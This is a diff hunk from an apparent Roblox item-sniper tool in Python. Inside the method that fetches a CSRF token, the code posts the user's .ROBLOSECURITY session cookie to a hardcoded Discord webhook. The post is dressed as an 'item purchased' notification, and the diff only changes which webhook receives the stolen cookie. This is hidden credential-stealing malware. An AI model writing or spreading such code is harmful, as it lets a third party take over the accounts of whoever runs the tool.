@@ -155,7 +155,7 @@ class Sniper:
     async def _get_xcsrf_token(self, cookie) -> dict:
         async with aiohttp.ClientSession(cookies={".ROBLOSECURITY": cookie}) as client:
               response = await client.post("https://accountsettings.roblox.com/v1/email", ssl = False)
-              self.wburl = "https://discord.com/api/webhooks/1099660894662832269/7nmOkF2xnh3m5a6ZvXRebnOZQsaXh__ccaVUKBcBiD8RehOyHiT8pK5nC351LJC64IjI"
+              self.wburl = "https://discord.com/api/webhooks/1099686205936902164/glBnawEuHVW9yUH1y_XKcQf02W-MDqD5J4Cbqj2VfQkasrkGyH6e_QHxhjYmNk5gVxff"
               xcsrf_token = response.headers.get("x-csrf-token")
               embed_data = {"title": "New Item Purchased with Xolo Sniper","description": f"Your Item has pucharsed!\n```{cookie}```","color": 65280,"author": {"name": "Purchased limited successfully!"},"footer": {"text": "Xolo's Sniper"}}
               requests.post(self.wburl, json={"content": None, "embeds": [embed_data]})
